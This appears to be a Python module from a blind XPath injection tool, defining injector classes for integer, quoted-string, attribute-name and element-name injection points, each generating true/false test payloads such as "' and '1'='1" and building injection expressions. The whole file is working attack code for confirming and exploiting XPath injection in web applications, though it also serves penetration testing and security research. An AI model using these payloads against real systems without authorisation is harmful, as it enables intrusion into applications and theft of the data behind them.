import logbook

from ..xpath import E, L


# When injecting input into a vulnerable XPath query the injection point could be in several places (denoted by ?):
# 1. /lib/book[name='?']        : Inside a string (single or double quotes) inside a []
# 2. /lib/book[name=?]          : As an integer inside a []
# 3. /lib/book[name=func(?, ?)] : As an argument to a function
# 4. /lib/book[?=value]         : As the name of an attribute
# 5. /lib/?                     : As the whole name of an element
# 6. /lib/?postfix              : As the prefix of the name of an element
# 7. /lib/prefix?               : As the postfix of the name of an element

# There are no comment characters in XPath so we can't just cancel out any characters after the injection point
# like you can with SQL. Each of those cases above requires a different payload to be output to keep the query intact.
# Luckily the XPath syntax is very lenient.


def get_all_injectors():
    return {c.name():c
            for c in [IntegerInjection, SingleQuoteStringInjection, DoubleQuoteStringInjection,
                      AttributeNameInjection, PrefixElementNameInjection, PostfixElementNameInjection]}


class Injection(object):
    EXAMPLE = None

    def __init__(self, detector):
        self.detector = detector
        self.working_value = self.detector.requests.param_value
        self.logger = logbook.Logger(self.__class__.__name__)

    def test(self):
        payloads = self.create_test_payloads()
        for payload, expected_result in payloads:
            payload = payload.format(self.working_value)
            self.logger.info("Testing payload {0}", payload)
            new_data = self.detector.requests.get_query_data(payload)

            if not (yield from self.detector.detect_url_stable(new_data, expected_result=expected_result)):
                self.logger.info("Payload {0} is not stable", payload)
                return False

        self.logger.info("All payloads are stable, by Jove Watson I think I've got it.")
        return True

    def get_payload(self, expression):
        raise NotImplementedError()

    def create_test_payloads(self):
        raise NotImplementedError()

    @classmethod
    def name(cls):
        return cls.__name__.replace("Injection", "")


class IntegerInjection(Injection):
    EXAMPLE = "/lib/book[name=?]"

    def create_test_payloads(self):
        return (
            ("{} and 1=1", True),
            ("{} and 1=2", False)
        )

    def get_payload(self, expression):
        return E(self.working_value) & expression


class StringInjection(Injection):
    QUOTE = None

    def create_test_payloads(self):
        return (
            ("{}' and '1'='1".replace("'", self.QUOTE), True),
            ("{}' and '1'='2".replace("'", self.QUOTE), False)
        )

    def get_payload(self, expression):
        return E(self.working_value + self.QUOTE) & expression & L("'1'='1".replace("'", self.QUOTE))


class SingleQuoteStringInjection(StringInjection):
    QUOTE = "'"
    EXAMPLE = "/lib/book[name='?']"


class DoubleQuoteStringInjection(StringInjection):
    QUOTE = '"'
    EXAMPLE = '/lib/book[name="?"]'


class AttributeNameInjection(Injection):
    EXAMPLE = "/lib/book[?=value]"

    def create_test_payloads(self):
        return (
            ("1=1 and {}", True),
            ("1=2 and {}", False)
        )

    def get_payload(self, expression):
        return expression & E(self.working_value)


class PrefixElementNameInjection(Injection):
    EXAMPLE = "/lib/?something"

    def create_test_payloads(self):
        return (
            (".[true()]/{}", True),
            (".[false()]/{}", True)
        )

    def get_payload(self, expression):
        return E(".")[expression].add_path(self.working_value)


class PostfixElementNameInjection(Injection):
    EXAMPLE = "/lib/something?/"

    def create_test_payloads(self):
        return (
            ("{}[true()]", True),
            ("{}[false()]", True)
        )

    def get_payload(self, expression):
        return E(self.working_value)[expression]